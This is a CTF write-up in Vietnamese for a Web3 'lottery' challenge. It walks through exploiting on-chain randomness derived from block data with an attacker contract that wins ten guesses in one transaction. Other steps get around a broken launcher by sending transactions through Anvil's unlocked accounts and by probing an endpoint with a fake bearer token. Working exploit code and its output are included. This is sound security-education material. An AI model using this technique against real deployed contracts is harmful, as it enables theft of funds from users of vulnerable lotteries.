# lottery - Web3 (299 pts)

**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}`
**Files:** `Lottery.sol` (1153 B, SHA256: `38f58ac2...`), `Setup.sol` (314 B, SHA256: `ebb2b795...`)

## Đề bài

Dịch vụ tại `34.116.80.78:31338` cung cấp một contract đoán số. Mỗi lần gọi `guess(_guess)`, `Lottery` tính `target = random() % 100`. Đoán đúng tăng `streaks[msg.sender]` lên 1; đoán sai đặt lại về 0. Sau 10 lần đúng liên tiếp, contract gán `winner = msg.sender`. `Setup.sol` kiểm tra:

```solidity
function isSolved() external view returns (bool) {
    return lottery.winner() != address(0);
}
```


Launcher có ba thao tác: `1 launch new instance`, `2 kill instance` và `3 get flag`. Khi hoạt động bình thường, thao tác launch trả UUID, RPC endpoint, private key và địa chỉ `Setup`. Ticket là tên đội, có phân biệt chữ hoa và chữ thường.

## Phân tích

Ba đặc điểm của `Lottery.sol` cho phép giải challenge trong một transaction:

1. `random()` là hàm `view`, dùng `blockhash(block.number - 1)`, `block.timestamp` và `block.difficulty`. Các giá trị này không đổi giữa các lời gọi trong cùng transaction.
2. `guess()` dùng cùng công thức `random() % 100`, không có salt hoặc bí mật riêng.
3. Contract không giới hạn số lần gọi `guess()` trong một transaction và không kiểm tra `tx.origin`.

`isSolved()` chỉ yêu cầu `winner != address(0)`, nên winner có thể là một contract. Contract trung gian có thể lặp 10 lần `{ t = random()%100; guess(t) }` trong một transaction.

RPC trả `eth_chainId = 0x1` và block number khoảng `26096389`. Trong instance, Anvil trả `block.difficulty = 0`; lời giải chỉ cần giá trị này nhất quán trong transaction, không cần dự đoán trước.

## Lời giải

**Bước 1 - Viết contract `Attacker`.**

Gộp 10 lượt đoán trong một transaction để các lời gọi `random()` dùng cùng dữ liệu block:

```solidity
contract Attacker {
    address public immutable lottery;
    constructor(address _lottery) { lottery = _lottery; }
    function run(uint256 _n) external {
        for (uint256 i = 0; i < _n; i++) {
            uint256 target = ILottery(lottery).random() % 100;
            ILottery(lottery).guess(target);
        }
    }
}
```


Thử local với `Setup.sol` gốc: `run(10)` dùng 117.955 gas, `winner` trở thành địa chỉ `Attacker` và `isSolved()` trả `true`.

**Bước 2 - Xử lý lỗi launcher.**

Từ 13:50 đến 15:51, thao tác launch báo `json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)` tại `eth_sandbox/launcher.py:99`. `GET http://34.116.80.78:8546/` vẫn trả `sandbox is running!`. Thử `POST /new` với fake bearer nhận được JSON, cho thấy endpoint vẫn phản hồi nhưng luồng tạo instance qua launcher gặp lỗi:

```text
http=200 bytes=32 type=application/json
{"error":"nice try","ok":false}
```


Sau khi launcher phản hồi trở lại, thao tác launch chỉ trả UUID và RPC rồi dừng:

```text
uuid:           17d5c78a-b92e-480c-aa67-4d60eb754b44
rpc endpoint:   http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44
```


RPC của instance vẫn dùng được. Phần tiếp theo xử lý trường hợp thiếu private key và địa chỉ `Setup`.

**Bước 3 - Dùng tài khoản unlocked của Anvil.**

Bộ lọc trong `server.py` chặn `eth_sendUnsignedTransaction` và các method `anvil_*`, nhưng cho phép `eth_sendTransaction`. Anvil có các tài khoản unlocked, nên node có thể ký và gửi transaction thay vì ký bằng private key ở client:

```text
-- Danh sách accounts
["0xacccf717a6a03135d282e3b2767210106c7eab1c","0x6fbc29b5519b8e3f757f950e80db05af5dcb000e"]
-- Kiểm duyệt quyền gửi sendTransaction
{"jsonrpc":"2.0","id":3,"result":"0x2468973e8cf8f206bd15b21ae47fae613a9d9f3fc22814ccf1253463f7ca53bf"}
```


`accounts[0]` là deployer của `Setup`; `accounts[1]` là tài khoản người chơi. Mỗi tài khoản có 5000 ETH (`0x10f0cf064dd59200000`).

**Bước 4 - Tính địa chỉ contract bằng CREATE.**

Deployer tạo `Setup` ở nonce 0; `Setup` tạo `Lottery` ở nonce 1. Tính địa chỉ từ sender và nonce:

```python
def create_address(sender, nonce):
    h = keccak.new(digest_bits=256)
    h.update(rlp.encode([bytes.fromhex(sender[2:]), nonce]))
    return to_checksum_address("0x" + h.digest()[12:].hex())
```


Địa chỉ ứng viên có 726 byte code. Gọi getter `lottery()` trả về địa chỉ contract con, dùng để kiểm tra địa chỉ `Setup` đã tính:

```text
Ứng cử viên địa chỉ 0xE5Bf39E2a633f350eA183716b898b601530cBc85 độ dài code 726 bytes -> định tuyến tới lottery() 0x13b4Edba63FAcaDC68232DAFDAaF31f76Ca72A3b
```


**Bước 5 - Chạy lời giải.**

Deploy `Attacker(lottery)` bằng `accounts[1]`, rồi gọi `run(10)`:

```text
Attacker deployed: Địa chỉ 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2 trạng thái 0x1
Thực thi run(10) trạng thái: 0x1 tài nguyên gas tiêu hao: 135055
Trạng thái winner: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2
Kiểm chứng isSolved: True
```


**Bước 6 - Lấy flag qua launcher.**

Flag không nằm on-chain. Launcher đọc file `/tmp/<team_id>` đã tạo khi deploy instance, rồi gọi `isSolved()` qua RPC. Gửi thao tác `3` và ticket:

```text
>> 3
ticket please:
>> R3:TURИ
CSS{U5E_4_R4ND0M_FUNCT10N}
```


Hai lần gọi lúc 15:55:15 và 15:56:03 trả cùng kết quả. Sau đó, thao tác `2` với ticket trả `Instance killed`.

## Kết quả

```bash
python exploit.py http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44 "R3:TURИ"
```


Output:

```text
CSS{U5E_4_R4ND0M_FUNCT10N}
Ghi đè định dạng: CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```


## Tái hiện

```bash
python exploit.py <rpc-endpoint-cua-instance> "<ten doi>"
```


Script không cần private key hoặc địa chỉ `Setup` từ launcher. Nó lấy accounts qua RPC, tính địa chỉ bằng CREATE, kiểm tra getter, deploy `analysis/Attacker.sol` rồi gọi API lấy flag.

Để chạy với bản local, cần cấu hình Anvil phù hợp với launcher:

```bash
anvil --chain-id 31337 --block-base-fee-per-gas 0 --accounts 2 --balance 5000
```
